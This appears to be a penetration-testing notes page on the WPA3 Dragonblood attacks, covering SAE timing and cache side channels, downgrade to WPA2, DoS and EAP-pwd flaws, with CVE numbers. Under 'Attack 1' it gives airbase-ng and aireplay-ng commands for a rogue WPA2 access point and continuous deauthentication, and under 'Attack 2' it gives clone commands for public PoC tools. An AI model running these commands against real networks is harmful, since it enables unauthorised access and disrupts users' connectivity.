# WPA3 / Dragonblood

## The main idea behind Dragonblood attack is that WPA3's SAE handshake (Dragonfly) has to hash the password into a point "elliptic curve" before anything else happens. And the number of tries that takes leaks through timing/cache - enough leaked bits, across enough handshakes. So you can brute the password without capturing the hash traditionall.

Well, that really was a lot of difficult words, here's an easier example of attack's logic - 

Value for access = `Hash(Pass, MAC of both, N)`
if we fail -> `N+1` and we know this `N` based on time of the answer

Logically speaking
Iterations (this `N`) = f(password, MAC)

So we can just ask the router 
```
MAC AA -> 3 Iter
MAC BB -> 1 Iter
MAC BB -> 4 Iter
```

So our fingerprint is `[3, 1, 4]`
And remotely we can just calculate the password based on the fingerprint

```bash
"Pass1" -> 2, 2, 1 != [3, 1, 4]
"Pass2" -> 3, 2, 1 != [3, 1, 4]
"Pass3" -> 3, 1, 4 = [3, 1, 4]
```
---
<img width="1000" height="700" alt="wpa3-dragonblood-sae-loop" src="https://github.com/user-attachments/assets/68c89da7-4753-4ae8-850b-2482e252e931" />

- Side channel attacks (CVE-2019-9494 cache based, CVE-2019-13377 timing based) - small diff in timing / cache during this `pass - point` encoding narrows down candidate password
- Downgrade attacks - Most of WPA3 APs run WPA3-Transition mode, so a rogue AP can just offer WPA2 part skipping Dragonfly completely
- DoS - CVE-2019-9496 - hostapd/wpa_supplicant crash caused by missing state check in SAE's confirm-message. (fuzz the protocol to find it). Starting fake SAE commits burn the CPU of the AP which results in **Dragondrain**
- EAP-pwd (CVE-2019-9497/9498/9499) - same Dragonfly math used on **enterprise/Hotspot 2.0** broken via reflection and invalid-curves

---

## Attack 1 - Downgrade to WPA2
Most WPA3 runs transition mode, so we could just abuse WPA2

```bash
sudo airmon-ng start wlan0
sudo airbase-ng -a <AP_MAC> --essid "<SSID>" -c <CH> wlan0   # advertise WPA2-PSK only, same SSID
sudo aireplay-ng -0 0 -a <AP_MAC> wlan0
```
As the client connects on WPA2 - we're just performing basic WPA2 attack

## Attack 2 - Timing/cache side-channel (Dragonslayer / Dragondrain / Dragontime / Dragonforce)

Yes, these are Mathy Vanhoef's original research, and PoCs, not click-to-attack tools.
But they still can execute real exploits, so 
```bash
git clone https://github.com/vanhoefm/dragondrain-and-time
git clone https://github.com/vanhoefm/dragonslayer
```
- dragondrain - checks whether an AP is vulnerable to the SAE resource-exhaustion DoS
- dragontime - times repeated SAE handshakes against a MODP-group AP to build the side-channel dataset
- dragonforce - takes that timing/cache data offline and runs the actual password-partitioning attack
- dragonslayer - separate tool targeting EAP-pwd implementations with reflection/invalid-curve attacks (CVE-2019-9497/9498/9499), same research family, different protocol surface




